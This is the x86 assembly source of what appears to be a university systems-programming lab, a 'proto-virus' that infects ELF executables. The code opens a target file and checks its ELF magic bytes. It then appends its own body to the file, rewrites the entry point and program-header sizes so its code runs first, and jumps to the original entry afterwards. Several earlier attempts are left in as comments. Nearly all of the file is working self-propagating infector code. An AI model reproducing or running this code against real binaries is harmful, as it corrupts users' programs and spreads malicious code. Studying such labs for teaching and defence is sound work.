%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro getPICAddr 1 ;(pos)
    call	getPIC
    add	edx, (%1 - PIClocation)
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define stdout 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
%define EI_MAG0     0
%define ELFMAG0 0x7f

%define EI_MAG1     1
%define ELFMAG1     'E'

%define EI_MAG2		2		
%define ELFMAG2		'L'		

%define EI_MAG3		3		
%define ELFMAG3     'F'

%define	ELF_header_size	52
%define	loadAddr	0x08048000


	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
    getPICAddr OutStr
    mov ebx,edx
        ; mov ebx,PIClocation
        ; sub ebx,OutStr
        ; sub eax,ebx ;; get the relative location
    write stdout, ebx,32 ;; print the message OutStr
    getPICAddr FileName
    ; mov ebx,edx
    ; open ebx, RDWR, 0644
    
            mov	eax, 5
            mov	ebx, edx
            mov	ecx, RDWR
            mov	edx, 0644
            int	0x80
    cmp eax,0
    jl _perhapsNot
        ; open FileName, RDWR, 0
        ; mov [ebp-4],eax ;; eax holds the fd for the FileName
        ; cmp dword[ebp-4],-1  ;;error opening the file
        ; je _perhapsNot
        ; mov ebx,ebp  ;;the start of the buffer for reading
        ; sub ebx,8 
        ; read [ebp-4],ebx,4 ;; read 4 byted === \0ELF

        ; ;; and now check if it holds the magic number
        ; cmp byte[ebp-8+EI_MAG0],ELFMAG0
        ; jne ErrorOpeningAndMagic
        ; cmp byte[ebp-8+EI_MAG1],ELFMAG1
        ; jne ErrorOpeningAndMagic
        ; cmp byte[ebp-8+EI_MAG2],ELFMAG2
        ; jne ErrorOpeningAndMagic
        ; cmp byte[ebp-8+EI_MAG3],ELFMAG3
        ; jne ErrorOpeningAndMagic
        ; close [ebp-4]

    

    mov [ebp-4],eax
    lseek [ebp-4],0,SEEK_SET

    lea ecx,[ebp-200]
    read [ebp-4],ecx,84

    cmp	byte[ebp-200 + EI_MAG0], ELFMAG0
    jne	ErrorOpeningAndMagic
    cmp	byte[ebp-200+EI_MAG1], ELFMAG1
    jne	ErrorOpeningAndMagic
    cmp	byte[ebp-200 + EI_MAG2], ELFMAG2
    jne	ErrorOpeningAndMagic
    cmp	byte[ebp-200 + EI_MAG3], ELFMAG3
    jne	ErrorOpeningAndMagic

    lseek [ebp-4],0,SEEK_END
        ;;after lseek eax holds the original size of the file
    mov [ebp-8],eax ;; file size
        ;;entry point is 24 byte from the start of the buffer -> 200-24 = 176
    mov edx,dword[ebp-176] ;; edx holds the original entry point
    mov dword[ebp-12],edx

    ; call getPIC ;;eax holds the PIC
    ; add eax, _start - PIClocation ;; address of _start
    getPICAddr _start
    mov ebx,edx
    write [ebp-4],ebx,virus_end-_start ;- 4 ;; now add the _start func to the end of the ELFexec file

    lseek [ebp-4],0, SEEK_END ;; go ro the end of the file
    lea ecx,[ebp-12];; the original entry point

    ; write [ebp-4],ecx,4
    mov		eax, 4
    mov		ebx, [ebp-4]
    mov		edx, 4
    int		0x80


    mov eax,[ebp-8]
    add eax,[ebp-140] ;; vadd according to readelf
    mov dword[ebp-176],eax ;; update the entry points

        ;;now we need to update the new size
    lseek [ebp-4],0, SEEK_END
    mov dword[ebp-8],eax ;; new size
        ;; then we need to change the file size in the buffer to transfere it to memeory (including the virus size)
    mov dword[ebp-132],eax ;; file size
    mov dword[ebp-128],eax ;; mem size

        ; mov ebx,ebp
        ; sub ebx,8
        ; sub ebx,84 ;; ebx point to the start of the buffer in size of 52 (start form 60 to 8 in the stack)

        ; ;; Code to copy the ELF header into memory (on the stack). Do not forget to make sure that sufficient local storage is allocated on the stack before doing so.
        ; read [ebp-4],ebx,84
        ; mov eax,[ebp-60+ENTRY]
        ; mov [ebp-64],eax ;; save the old entry point
        ; mov eax,[ebp-8];; eax = file original address    
        ; ; add eax,loadAddr ;; get to the address of the EntryVirus in memory
        ; add eax,[ebp-60] ;;phdr resides in 52+ bytes, so vertual address +8 on ebp = 60
        ; mov [ebp-60+ENTRY],eax ;; change the entry in the buffer == new Entry now we need to insert the old entry

        ; lseek [ebp-4],0, SEEK_END ;; go to the end of the file -> eax holds the file size
        ; mov [ebp-8],eax
        ; ; mov ebx,ebp
        ; ; sub ebx,60
        ; mov [ebp-68],eax ;;readelf -> file size is in 68 byte
        ; mov [ebp-72],eax ;; readelf -> mem size si in 72 byte

    lseek [ebp-4],0, SEEK_SET
    lea ecx,[ebp-200]

    
    write [ebp-4],ecx,84 ;; update the changes in the ELFexec file
    close [ebp-4]

    ; call getPIC ;;eax holds the PIC
    ; add eax, PreviousEntryPoint - PIClocation
    getPICAddr PreviousEntryPoint
    jmp [edx]

    ; lseek [ebp-4],-4,SEEK_END ;;move almost to the end of the file
    ; mov ebx,ebp      ;;ebx points to the old entry point
    ; sub ebx,84
    ; write [ebp-4],ebx,84     ;; insert the old entry point in the file

    ; close [ebp-4]

VirusExit:
    ; exit 0
        getPICAddr bye
        mov ebx,edx
        write stdout,ebx,8
        exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
ErrorOpeningAndMagic:
    ; exit -1
            getPICAddr noMagic
            mov ebx,edx
            write stdout,ebx,12
        getPICAddr PreviousEntryPoint
        jmp [edx]
        exit -1      ;;exit error

_perhapsNot:
    getPICAddr msg
    mov ebx,edx
    write stdout,ebx,28
    
    getPICAddr PreviousEntryPoint
    jmp [edx]
    ; getPICAddr Failstr
    ; mov ebx,edx
    ; write stdout,ebx,12
    exit -1      ;;exit error

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
noMagic:        db "not Magical", 10 , 0
bye:            db "bye bye",10,0
msg:            db "finish virus go to original",10,0



getPIC:
    call PIClocation

PIClocation: pop edx
    ret



virus_end:

PreviousEntryPoint: dd VirusExit

